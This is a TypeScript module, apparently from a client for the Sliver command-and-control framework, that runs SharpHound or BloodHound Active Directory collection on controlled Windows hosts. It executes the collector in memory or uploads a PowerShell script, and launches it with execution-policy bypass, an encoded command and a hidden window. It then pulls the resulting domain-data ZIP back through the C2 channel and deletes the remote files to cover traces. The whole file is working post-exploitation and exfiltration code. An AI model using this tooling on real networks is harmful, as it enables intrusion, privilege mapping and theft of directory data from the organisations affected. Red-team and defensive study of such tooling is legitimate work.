import { randomUUID } from "node:crypto";
import { gunzipSync } from "node:zlib";
import { join } from "node:path";

import { sliverpb, type clientpb } from "sliver-script";
import { parseAdDomain, type AdCollectionMethod } from "../shared/ad-explorer-contracts.js";
import type { TargetSummary } from "../shared/target-contracts.js";
import type { SliverClientAdapter } from "./sliver-client-adapter.js";
import { writePrivateFileExclusiveAtomic } from "./secure-file.js";

export const AD_COLLECTION_MAX_BYTES = 64 * 1024 * 1024;
export const AD_COLLECTION_BEACON_MAX_BYTES = 12 * 1024 * 1024;
export const AD_COLLECTION_SCRIPT_MAX_BYTES = 4 * 1024 * 1024;
const REMOTE_OUTPUT_DIRECTORY = "C:\\Users\\Public";
const TASK_POLL_MS = 15_000;
const EXECUTION_DEADLINE_MS = 45 * 60_000;
const DOWNLOAD_DEADLINE_MS = 90 * 60_000;
const EXECUTION_TIMEOUT_SECONDS = 30 * 60;

export type AdCollectionClient = Pick<SliverClientAdapter,
  "executeAssemblySession" | "executeAssemblyBeacon" | "downloadFileSession" |
  "downloadAdCollectionBeacon" | "fetchAdCollectionBeaconTask" | "getBeaconTasks" | "rmSession" |
  "lsSession" | "lsBeacon" |
  "uploadSession" | "uploadAdCollectionBeacon" | "executeSession" | "executeBeacon" |
  "fetchBeaconTaskContent" | "rmAdCollectionBeacon">;

interface CollectSharpHoundBase {
  client: AdCollectionClient;
  target: TargetSummary;
  domain: string;
  collectionMethod: AdCollectionMethod;
  collectionRoot: string;
  assertCurrent: () => void;
  now?: () => number;
  delay?: (milliseconds: number) => Promise<void>;
}

export type CollectSharpHoundInput = CollectSharpHoundBase & (
  | { collectorKind?: "exe"; assembly: Buffer; script?: never }
  | { collectorKind: "powershell"; script: Buffer; assembly?: never }
);

/**
 * Runs one explicit SharpHound collection and saves only a complete ZIP to the
 * main-owned client directory. The source collector and returned bytes never
 * cross renderer IPC. A beacon waits for each correlated async task response.
 */
export async function collectSharpHound(input: CollectSharpHoundInput): Promise<string> {
  const now = input.now ?? Date.now;
  const delay = input.delay ?? ((milliseconds: number) => new Promise<void>((resolve) => setTimeout(resolve, milliseconds)));
  const target = input.target;
  const domain = parseAdDomain(input.domain);
  if (target.os !== "windows" || (target.arch !== "amd64" && target.arch !== "386")) {
    throw new Error("SharpHound collection requires a supported Windows x64 or x86 target");
  }
  if (target.mode === "session" && target.liveness !== "active") {
    throw new Error("The selected Windows session is no longer active");
  }
  const fileName = `sliver-ad-${randomUUID()}.zip`;
  const remotePath = `${REMOTE_OUTPUT_DIRECTORY}\\${fileName}`;
  const scriptPath = `${remotePath.slice(0, -4)}.ps1`;
  const arguments_ = [
    "--collectionmethods", input.collectionMethod,
    "--domain", domain,
    "--outputdirectory", REMOTE_OUTPUT_DIRECTORY,
    "--zipfilename", fileName,
    "--memcache",
  ];
  let bytes: Buffer | undefined;
  try {
    input.assertCurrent();
    if (input.collectorKind === "powershell") {
      await executePowerShellCollector(input, domain, scriptPath, fileName, now, delay);
    } else {
      await executeAssemblyCollector(input, arguments_, now, delay);
    }
    input.assertCurrent();
    const resolvedRemotePath = await resolveRemoteZipPath(input.client, target, fileName,
      input.assertCurrent, now, delay);
    input.assertCurrent();
    bytes = target.mode === "session"
      ? await downloadSession(input.client, target.id, resolvedRemotePath)
      : await downloadBeacon(input.client, target.id, resolvedRemotePath, input.assertCurrent, now, delay);
    input.assertCurrent();
    if (!isCompleteZipEnvelope(bytes)) throw new Error("The collector output was not a complete ZIP archive");
    const localPath = join(input.collectionRoot, domain, fileName);
    await writePrivateFileExclusiveAtomic(localPath, bytes, input.assertCurrent);
    if (target.mode === "session") {
      // Only the generated unique ZIP path is removed, after verified local save.
      // A failed remote cleanup does not erase the saved collection.
      await input.client.rmSession(target.id, resolvedRemotePath, false, true, 30).catch(() => undefined);
    } else {
      // Beacon removals are queued only after the complete ZIP is saved.
      await input.client.rmAdCollectionBeacon(target.id, resolvedRemotePath, 30).catch(() => undefined);
    }
    return localPath;
  } finally {
    bytes?.fill(0);
  }
}

async function resolveRemoteZipPath(
  client: AdCollectionClient,
  target: TargetSummary,
  requestedName: string,
  assertCurrent: () => void,
  now: () => number,
  delay: (milliseconds: number) => Promise<void>,
): Promise<string> {
  assertCurrent();
  let listing: sliverpb.Ls;
  if (target.mode === "session") {
    listing = await client.lsSession(target.id, REMOTE_OUTPUT_DIRECTORY, 120);
  } else {
    const acknowledged = await client.lsBeacon(target.id, REMOTE_OUTPUT_DIRECTORY, 120);
    if (acknowledged.Response?.Err?.trim()) throw new Error("The beacon could not list the SharpHound output directory");
    const taskId = requireTaskId(acknowledged.Response);
    let completed: sliverpb.Ls | undefined;
    await waitForBeaconTask(client, taskId, target.id, ["LsReq"],
      now() + DOWNLOAD_DEADLINE_MS, assertCurrent, now, delay, (task) => {
        if (!task.Response.length) throw new Error("The beacon returned no SharpHound output listing");
        completed = sliverpb.Ls.decode(task.Response);
      }, (id) => client.fetchBeaconTaskContent(target.id, id, "LsReq", 30));
    if (!completed) throw new Error("The beacon returned no SharpHound output listing");
    listing = completed;
  }
  assertCurrent();
  if (listing.Response?.Err?.trim() || !listing.Exists ||
      listing.Path.replace(/[\\/]$/u, "").toLowerCase() !== REMOTE_OUTPUT_DIRECTORY.toLowerCase()) {
    throw new Error("The target could not list the SharpHound output directory");
  }
  // SharpHound CE prepends its own UTC timestamp to --zipfilename. Match the
  // complete generated suffix and reject duplicates rather than downloading
  // another collection from the same shared directory.
  const expected = new RegExp(`^\\d{14}_${requestedName.replace(/[.*+?^${}()|[\]\\]/gu, "\\$&")}$`, "u");
  const matches = listing.Files.filter((file) => expected.test(file.Name));
  if (matches.length !== 1) throw new Error("SharpHound did not produce one uniquely named ZIP in the output directory");
  const file = matches[0]!;
  const maxBytes = target.mode === "session" ? AD_COLLECTION_MAX_BYTES : AD_COLLECTION_BEACON_MAX_BYTES;
  if (file.IsDir || file.Link || !/^[0-9]+$/u.test(file.Size) ||
      !Number.isSafeInteger(Number(file.Size)) || Number(file.Size) < 1 ||
      Number(file.Size) >= maxBytes) {
    throw new Error(`The SharpHound ZIP is invalid or exceeds the ${target.mode === "session" ? "64" : "12"} MiB limit`);
  }
  return `${REMOTE_OUTPUT_DIRECTORY}\\${file.Name}`;
}

async function executeAssemblyCollector(
  input: CollectSharpHoundBase & { assembly: Buffer },
  arguments_: string[],
  now: () => number,
  delay: (milliseconds: number) => Promise<void>,
): Promise<void> {
  const { target } = input;
  const options = {
    arguments: arguments_, isDll: false, arch: target.arch === "amd64" ? "x64" : "x86",
  };
  const execution = target.mode === "session"
    ? await input.client.executeAssemblySession(target.id, input.assembly, options, EXECUTION_TIMEOUT_SECONDS)
    : await input.client.executeAssemblyBeacon(target.id, input.assembly, options, EXECUTION_TIMEOUT_SECONDS);
  try {
    input.assertCurrent();
    if (execution.Response?.Err?.trim()) throw new Error("The target rejected SharpHound execution");
    if (/The \.Net Runtime is not compatible with SharpHound\. Please update to \.Net 4\.7\.2\./iu
      .test(execution.Output.subarray(0, 64 * 1024).toString("utf8"))) {
      throw new Error("SharpHound CE requires .NET Framework 4.7.2 or later on this target");
    }
    if (target.mode === "beacon") {
      const taskId = requireTaskId(execution.Response);
      await waitForBeaconExecution(input.client, taskId, target.id,
        now() + EXECUTION_DEADLINE_MS, input.assertCurrent, now, delay);
    }
  } finally { execution.Output.fill(0); }
}

async function executePowerShellCollector(
  input: CollectSharpHoundBase & { collectorKind: "powershell"; script: Buffer },
  domain: string,
  scriptPath: string,
  zipFileName: string,
  now: () => number,
  delay: (milliseconds: number) => Promise<void>,
): Promise<void> {
  const { target, client } = input;
  if (!input.script.length || input.script.length > AD_COLLECTION_SCRIPT_MAX_BYTES) {
    throw new Error("The selected PowerShell collector must be at most 4 MiB");
  }
  if (!/^\s*function\s+Invoke-BloodHound\b/imu.test(input.script.toString("utf8"))) {
    throw new Error("The selected PowerShell collector must define Invoke-BloodHound");
  }

  let uploadAttempted = false;
  try {
    input.assertCurrent();
    uploadAttempted = true;
    if (target.mode === "session") {
      const uploaded = await client.uploadSession(target.id, scriptPath, input.script, {
        isDirectory: false, overwrite: false, isIOC: false,
      }, 120);
      assertUploadedScript(uploaded, scriptPath);
    } else {
      const acknowledged = await client.uploadAdCollectionBeacon(target.id, scriptPath, input.script, 120);
      if (acknowledged.Response?.Err?.trim()) throw new Error("The beacon rejected the PowerShell collector upload");
      const taskId = requireTaskId(acknowledged.Response);
      await waitForBeaconTask(client, taskId, target.id, ["UploadReq"],
        now() + DOWNLOAD_DEADLINE_MS, input.assertCurrent, now, delay, (task) => {
          if (!task.Response.length) throw new Error("The beacon returned no PowerShell upload result");
          assertUploadedScript(sliverpb.Upload.decode(task.Response), scriptPath);
        }, (id) => client.fetchBeaconTaskContent(target.id, id, "UploadReq", 30));
    }

    input.assertCurrent();
    const command = powerShellCommand(scriptPath, domain, zipFileName, input.collectionMethod);
    const utf16 = Buffer.from(command, "utf16le");
    let encoded: string;
    try { encoded = utf16.toString("base64"); } finally { utf16.fill(0); }
    const options = {
      path: "powershell.exe",
      args: ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded],
      output: true,
      hideWindow: true,
    };
    const execution = target.mode === "session"
      ? await client.executeSession(target.id, options, EXECUTION_TIMEOUT_SECONDS)
      : await client.executeBeacon(target.id, options, EXECUTION_TIMEOUT_SECONDS);
    try {
      input.assertCurrent();
      if (execution.Response?.Err?.trim() || (target.mode === "session" && execution.Status !== 0)) {
        throw new Error("The PowerShell collector did not complete successfully");
      }
      if (target.mode === "beacon") {
        const taskId = requireTaskId(execution.Response);
        await waitForBeaconTask(client, taskId, target.id, ["ExecuteWindowsReq"],
          now() + EXECUTION_DEADLINE_MS, input.assertCurrent, now, delay, (task) => {
            const completed = sliverpb.Execute.decode(task.Response);
            try {
              if (completed.Response?.Err?.trim() || completed.Status !== 0) {
                throw new Error("The PowerShell collector did not complete successfully");
              }
            } finally { completed.Stdout.fill(0); completed.Stderr.fill(0); }
          }, (id) => client.fetchBeaconTaskContent(target.id, id, "ExecuteWindowsReq", 30));
      }
    } finally { execution.Stdout.fill(0); execution.Stderr.fill(0); }
  } finally {
    if (uploadAttempted) {
      // Cleanup is restricted to the freshly generated path. A failed cleanup
      // cannot erase a successfully collected and saved ZIP.
      if (target.mode === "session") {
        await client.rmSession(target.id, scriptPath, false, true, 30).catch(() => undefined);
      } else {
        await client.rmAdCollectionBeacon(target.id, scriptPath, 30).catch(() => undefined);
      }
    }
  }
}

function assertUploadedScript(upload: sliverpb.Upload, scriptPath: string): void {
  if (upload.Response?.Err?.trim() || upload.Path.toLowerCase() !== scriptPath.toLowerCase() ||
      upload.WrittenFiles !== 1 || upload.UnwriteableFiles !== 0) {
    throw new Error("The target did not save the selected PowerShell collector");
  }
}

function powerShellCommand(
  scriptPath: string,
  domain: string,
  zipFileName: string,
  method: AdCollectionMethod,
): string {
  const literal = (value: string): string => `'${value.replaceAll("'", "''")}'`;
  return [
    "$ErrorActionPreference = 'Stop'",
    "$ProgressPreference = 'SilentlyContinue'",
    "try {",
    `  . ${literal(scriptPath)}`,
    "  if (-not (Get-Command Invoke-BloodHound -CommandType Function -ErrorAction SilentlyContinue)) { throw 'Invoke-BloodHound is unavailable' }",
    `  Invoke-BloodHound -CollectionMethods ${literal(method)} -Domain ${literal(domain)} -OutputDirectory ${literal(REMOTE_OUTPUT_DIRECTORY)} -ZipFilename ${literal(zipFileName)} -MemCache | Out-Null`,
    "} catch {",
    "  [Console]::Error.WriteLine($_.Exception.Message)",
    "  exit 1",
    "}",
  ].join("\n");
}

async function downloadSession(client: AdCollectionClient, targetId: string, remotePath: string): Promise<Buffer> {
  const response = await client.downloadFileSession(targetId, remotePath, { maxBytes: AD_COLLECTION_MAX_BYTES }, 120);
  if (response.Response?.Err?.trim() || !response.Exists || response.IsDir ||
      !response.Data.length || response.Data.length >= AD_COLLECTION_MAX_BYTES) {
    response.Data.fill(0);
    throw new Error("SharpHound did not produce a complete downloadable ZIP within the 64 MiB limit");
  }
  return response.Data;
}

async function downloadBeacon(
  client: AdCollectionClient,
  beaconId: string,
  remotePath: string,
  assertCurrent: () => void,
  now: () => number,
  delay: (milliseconds: number) => Promise<void>,
): Promise<Buffer> {
  const deadline = now() + DOWNLOAD_DEADLINE_MS;
  assertCurrent();
  const acknowledged = await client.downloadAdCollectionBeacon(beaconId, remotePath, AD_COLLECTION_BEACON_MAX_BYTES + 1, 120);
  let taskId: string;
  try {
    if (acknowledged.Response?.Err?.trim()) throw new Error("The beacon rejected the AD collection download");
    taskId = requireTaskId(acknowledged.Response);
  } finally { acknowledged.Data.fill(0); }
  let data: Buffer | undefined;
  try {
    await waitForBeaconTask(client, taskId, beaconId, ["DownloadReq"], deadline, assertCurrent, now, delay, (task) => {
      const response = sliverpb.Download.decode(task.Response);
      try {
        if (response.Response?.Err?.trim() || !response.Exists || response.IsDir || response.UnreadableFiles > 0 ||
            response.Path.toLowerCase() !== remotePath.toLowerCase()) {
          throw new Error("The beacon did not return the selected SharpHound ZIP");
        }
        data = decodeZipTransfer(response.Data, response.Encoder);
      } finally { response.Data.fill(0); }
    });
    if (!data?.length || data.length > AD_COLLECTION_BEACON_MAX_BYTES) {
      throw new Error("The beacon ZIP exceeds the 12 MiB collection limit or is empty");
    }
    return data;
  } catch (error) {
    data?.fill(0);
    throw error;
  }
}

function decodeZipTransfer(data: Buffer, encoder: string): Buffer {
  if (encoder === "") {
    if (data.length > AD_COLLECTION_BEACON_MAX_BYTES + 1) throw new Error("The beacon ZIP exceeds the 12 MiB collection limit");
    return Buffer.from(data);
  }
  if (encoder !== "gzip") throw new Error("The beacon used an unsupported ZIP transfer encoding");
  try {
    return gunzipSync(data, { maxOutputLength: AD_COLLECTION_BEACON_MAX_BYTES + 1 });
  } catch {
    throw new Error("The beacon ZIP transfer was invalid or exceeded the collection limit");
  }
}

/** RPC metadata omits the large request/response blobs. The server still loads
 * its historical task rows, so poll at a moderate interval. */
async function waitForBeaconExecution(
  client: AdCollectionClient,
  taskId: string,
  beaconId: string,
  deadline: number,
  assertCurrent: () => void,
  now: () => number,
  delay: (milliseconds: number) => Promise<void>,
): Promise<void> {
  while (now() < deadline) {
    assertCurrent();
    const tasks = await client.getBeaconTasks(beaconId, 30);
    try {
      const task = tasks.Tasks.find((candidate) => candidate.ID === taskId);
      if (task) {
        if (task.BeaconID !== beaconId || !["InvokeExecuteAssemblyReq", "InvokeInProcExecuteAssemblyReq"].includes(task.Description)) {
          throw new Error("Beacon SharpHound task identity changed");
        }
        const state = task.State.trim().toLowerCase();
        if (state === "completed") return;
        if (state === "failed" || state === "canceled" || state === "cancelled") {
          throw new Error("The beacon SharpHound task did not complete");
        }
        if (state !== "pending" && state !== "sent") throw new Error("Unknown beacon SharpHound task state");
      }
    } finally {
      for (const task of tasks.Tasks) { task.Request.fill(0); task.Response.fill(0); }
    }
    await delay(Math.min(TASK_POLL_MS, Math.max(0, deadline - now())));
  }
  throw new Error("The beacon SharpHound task did not complete before its deadline");
}

async function waitForBeaconTask(
  client: AdCollectionClient,
  taskId: string,
  beaconId: string,
  expectedDescriptions: readonly string[],
  deadline: number,
  assertCurrent: () => void,
  now: () => number,
  delay: (milliseconds: number) => Promise<void>,
  onComplete: (task: clientpb.BeaconTask) => void,
  fetchTask: (taskId: string) => Promise<clientpb.BeaconTask> = (id) => client.fetchAdCollectionBeaconTask(id, 30),
): Promise<void> {
  while (now() < deadline) {
    assertCurrent();
    const task = await fetchTask(taskId);
    try {
      if (task.ID !== taskId || task.BeaconID !== beaconId) throw new Error("Beacon collection task identity changed");
      const state = task.State.trim().toLowerCase();
      if (state === "completed") {
        if (!expectedDescriptions.includes(task.Description)) throw new Error("Beacon collection task type changed");
        onComplete(task);
        return;
      }
      if (state === "failed" || state === "canceled" || state === "cancelled") {
        throw new Error("The beacon collection task did not complete");
      }
      if (state !== "pending" && state !== "sent") throw new Error("Unknown beacon collection task state");
    } finally {
      task.Request.fill(0);
      task.Response.fill(0);
    }
    await delay(Math.min(TASK_POLL_MS, Math.max(0, deadline - now())));
  }
  throw new Error("The beacon collection task did not complete before its deadline");
}

function requireTaskId(response: { Async: boolean; TaskID: string } | undefined): string {
  const id = response?.TaskID;
  if (!response?.Async || typeof id !== "string" || !/^[A-Za-z0-9_-]{1,128}$/u.test(id)) {
    throw new Error("The beacon did not return a correlated AD collection task");
  }
  return id;
}

export function isCompleteZipEnvelope(bytes: Buffer): boolean {
  if (bytes.length < 30 || bytes.readUInt32LE(0) !== 0x04034b50) return false;
  const first = Math.max(0, bytes.length - 22 - 65_535);
  for (let offset = bytes.length - 22; offset >= first; offset--) {
    if (bytes.readUInt32LE(offset) !== 0x06054b50) continue;
    const commentBytes = bytes.readUInt16LE(offset + 20);
    const entries = bytes.readUInt16LE(offset + 10);
    const centralBytes = bytes.readUInt32LE(offset + 12);
    const centralOffset = bytes.readUInt32LE(offset + 16);
    if (commentBytes + offset + 22 !== bytes.length || entries === 0 ||
        entries !== bytes.readUInt16LE(offset + 8) ||
        bytes.readUInt16LE(offset + 4) !== 0 || bytes.readUInt16LE(offset + 6) !== 0 ||
        centralOffset + centralBytes !== offset || centralBytes < 46 ||
        !hasCompleteCentralDirectory(bytes, centralOffset, offset, entries)) continue;
    return true;
  }
  return false;
}

function hasCompleteCentralDirectory(bytes: Buffer, start: number, end: number, entries: number): boolean {
  let cursor = start;
  for (let index = 0; index < entries; index++) {
    if (cursor + 46 > end || bytes.readUInt32LE(cursor) !== 0x02014b50 ||
        bytes.readUInt16LE(cursor + 34) !== 0) return false;
    const nameBytes = bytes.readUInt16LE(cursor + 28);
    const extraBytes = bytes.readUInt16LE(cursor + 30);
    const commentBytes = bytes.readUInt16LE(cursor + 32);
    const next = cursor + 46 + nameBytes + extraBytes + commentBytes;
    if (!nameBytes || next > end) return false;
    const sizes = centralZip64Sizes(bytes, cursor, nameBytes, extraBytes);
    if (!sizes) return false;
    const { compressedBytes, local } = sizes;
    if (local + 30 > start || bytes.readUInt32LE(local) !== 0x04034b50) return false;
    const localNameBytes = bytes.readUInt16LE(local + 26);
    const localExtraBytes = bytes.readUInt16LE(local + 28);
    const contents = local + 30 + localNameBytes + localExtraBytes;
    if (contents + compressedBytes > start ||
        localNameBytes !== nameBytes ||
        !bytes.subarray(local + 30, local + 30 + nameBytes).equals(bytes.subarray(cursor + 46, cursor + 46 + nameBytes))) return false;
    cursor = next;
  }
  return cursor === end;
}

function centralZip64Sizes(bytes: Buffer, cursor: number, nameBytes: number, extraBytes: number):
  { compressedBytes: number; local: number } | null {
  const uncompressed32 = bytes.readUInt32LE(cursor + 24);
  const compressed32 = bytes.readUInt32LE(cursor + 20);
  const local32 = bytes.readUInt32LE(cursor + 42);
  if (compressed32 !== 0xffffffff && local32 !== 0xffffffff) {
    return { compressedBytes: compressed32, local: local32 };
  }
  // zip-rs emits ZIP64 entry sizes even for small in-memory archives. In a
  // ZIP64 extra field, only saturated 32-bit values are present, in this order.
  let field = cursor + 46 + nameBytes;
  const end = field + extraBytes;
  while (field + 4 <= end) {
    const kind = bytes.readUInt16LE(field);
    const length = bytes.readUInt16LE(field + 2);
    const dataEnd = field + 4 + length;
    if (dataEnd > end) return null;
    if (kind === 1) {
      let at = field + 4;
      const next64 = (): number | null => {
        if (at + 8 > dataEnd) return null;
        const value = bytes.readBigUInt64LE(at);
        at += 8;
        return value <= BigInt(Number.MAX_SAFE_INTEGER) ? Number(value) : null;
      };
      if (uncompressed32 === 0xffffffff && next64() === null) return null;
      const compressedBytes = compressed32 === 0xffffffff ? next64() : compressed32;
      const local = local32 === 0xffffffff ? next64() : local32;
      return compressedBytes === null || local === null ? null : { compressedBytes, local };
    }
    field = dataEnd;
  }
  return null;
}
